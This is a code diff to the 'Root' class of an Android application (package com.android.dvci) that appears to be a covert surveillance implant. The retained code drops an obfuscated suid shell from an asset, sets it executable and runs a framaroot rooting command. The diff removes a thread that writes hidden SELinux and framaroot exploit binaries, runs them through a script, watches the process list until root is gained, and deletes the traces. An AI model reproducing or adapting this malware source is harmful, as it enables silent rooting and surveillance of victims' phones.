@@ -2,7 +2,6 @@ package com.android.dvci;
 
 import android.content.Context;
 import android.content.pm.PackageManager;
-import android.widget.Toast;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.capabilities.PackageInfo;
@@ -29,7 +28,6 @@ import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
 import java.util.Date;
 import java.util.Properties;
-import java.util.concurrent.Semaphore;
 
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
@@ -562,26 +560,11 @@ public class Root {
 			InputStream shellStream = Utils.getAssetStream(M.e("sb.data"));
 
 			fileWrite(suidShell, shellStream, Cfg.RNDDB);
-
 			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidShell);
 
 			// Create the rooting script
 			String pack = Status.getAppContext().getPackageName();
-
-			String script = M.e("#!/system/bin/sh") + "\n"
-					+ String.format(M.e("/data/data/%s/files/l /data/data/%s/files/ss rt"), pack, pack) + "\n";
-
-			if (Root.createScript("les", script) == true) {
-				Process runScript = Runtime.getRuntime().exec(path + "/les");
-
-				runScript.waitFor();
-
-				Root.removeScript("les");
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " ERROR: (framarootExploit), cannot create script");
-				}
-			}
+			Execute.execute(String.format(M.e("/data/data/%s/files/l /data/data/%s/files/ss rt"), pack, pack));
 
 			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
 			file.delete();
@@ -950,191 +933,4 @@ public class Root {
 		return 1;
 	}
 
-	static class LinuxExploitThread implements Runnable {
-		private static final String TAG = "selinuxExploitThread";
-		private final boolean frama;
-		private final boolean selinux;
-
-		Semaphore semaphore = new Semaphore(1);
-
-		public LinuxExploitThread(boolean frama, boolean selinux) {
-			this.frama = frama;
-			this.selinux = selinux;
-		}
-
-		@Override
-		public void run() {
-
-			try {
-				if (!semaphore.tryAcquire()) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (exploitPhone), already exploiting");
-					}
-					return;
-				}
-
-				if (frama ){
-					if(checkFramarootExploitability()) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (exploitPhone): Device seems frama exploitable"); //$NON-NLS-1$
-						}
-						method = M.e("framaroot");
-						runFramalinuxExploit();
-					}else{
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (exploitPhone), not exploitable by Framaroot");
-						}
-					}
-				}
-
-				if (selinux && PackageInfo.checkRoot() == false){
-					if(checkSELinuxExploitability()) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
-						}
-						method = M.e("selinux");
-						runSelinuxExploit();
-					}else{
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (exploitPhone), not exploitable by Selinux");
-						}
-					}
-				}
-
-			} finally {
-				semaphore.release();
-			}
-
-		}
-
-		public void runFramalinuxExploit() {
-			framarootExploit();
-		}
-
-		public void runSelinuxExploit() {
-			final File filesPath = Status.getAppContext().getFilesDir();
-			final String path = filesPath.getAbsolutePath();
-			final String localExploit = M.e("vs"); // selinux_exploit
-			final String selinuxSuidext = M.e("qj"); // selinux_suidext
-			final String suidext = M.e("ss"); // suidext (standard)
-
-			AutoFile vs = new AutoFile(path, localExploit);
-			if (vs.exists()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (runSelinuxExploit) localexploit running?");
-				}
-				return;
-			}
-
-			try {
-				InputStream streamExpl = Utils.getAssetStream(M.e("gb.data")); // selinux_exploit
-				InputStream streamSelinuxSuidext = Utils.getAssetStream(M.e("jb.data")); // selinux_suidext
-				// rilcap
-				InputStream streamSuidext = Utils.getAssetStream(M.e("sb.data")); // suidext
-
-				Root.fileWrite(localExploit, streamExpl, Cfg.RNDDB);
-				Root.fileWrite(selinuxSuidext, streamSelinuxSuidext, Cfg.RNDDB);
-				Root.fileWrite(suidext, streamSuidext, Cfg.RNDDB);
-
-				Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
-				Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + selinuxSuidext);
-				Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
-
-				// Run SELinux exploit
-				// - argv[1]: path assoluto alla nuova shell
-				// - argv[2]: path assoluto alla vecchia shell
-				String pack = Status.getAppContext().getPackageName();
-
-				String script = M.e("#!/system/bin/sh")
-						+ "\n"
-						+ String.format(M.e("/data/data/%s/files/vs /data/data/%s/files/qj /data/data/%s/files/ss"),
-						pack, pack, pack) + "\n";
-
-				if (Root.createScript("fig", script) == true) {
-					Process runScript = Runtime.getRuntime().exec(path + "/fig");
-
-					// Non serve
-					runScript.waitFor();
-
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(run): " + runScript.getClass());
-					}
-
-					// Monitor exploit execution
-					boolean finished = true;
-					long curTime = System.currentTimeMillis();
-
-					while (System.currentTimeMillis() < curTime + (1000 * 60 * 8)) {
-						ExecuteResult result = Execute.execute("ps");
-
-						for (String s : result.stdout) {
-							if (s.contains("/files/vs")) {
-								if (Cfg.DEBUG) {
-									Check.log(TAG + "(runSelinuxExploit): exploitation in progress");
-								}
-								if (Cfg.DEMO){
-									Beep.bip();
-									Status.self().makeToast("exploitation in progress");
-								}
-								finished = false;
-								break;
-							}
-						}
-
-						if (finished) {
-							if(PackageInfo.checkRoot()) {
-								if (Cfg.DEBUG) {
-									Check.log(TAG + "(runSelinuxExploit): exploitation terminated after "
-											+ (System.currentTimeMillis() - curTime) / 1000 + " seconds");
-								}
-
-								Status.setRoot(true);
-								Status.self().setReload();
-
-								break;
-							}else{
-								if (Cfg.DEBUG) {
-									Check.log(TAG + " ERROR: (runSelinuxExploit), CANNOT GET ROOT by seLinux");
-								}
-							}
-						}
-
-						finished = true;
-						//Utils.sleep(5000);
-					}
-
-					Root.removeScript("fig");
-
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " ERROR: (runSelinuxExploit), cannot create script");
-					}
-					//PackageInfo.checkRoot();
-				}
-
-			} catch (final Exception e1) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e1);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(e1);//$NON-NLS-1$
-					Check.log(TAG + " (runSelinuxExploit): Exception"); //$NON-NLS-1$
-				}
-
-				return;
-			} finally {
-				File file = new File(Status.getAppContext().getFilesDir(), localExploit);
-				file.delete();
-
-				file = new File(Status.getAppContext().getFilesDir(), selinuxSuidext);
-				file.delete();
-
-				file = new File(Status.getAppContext().getFilesDir(), suidext);
-				file.delete();
-
-
-			}
-		}
-	}
 }
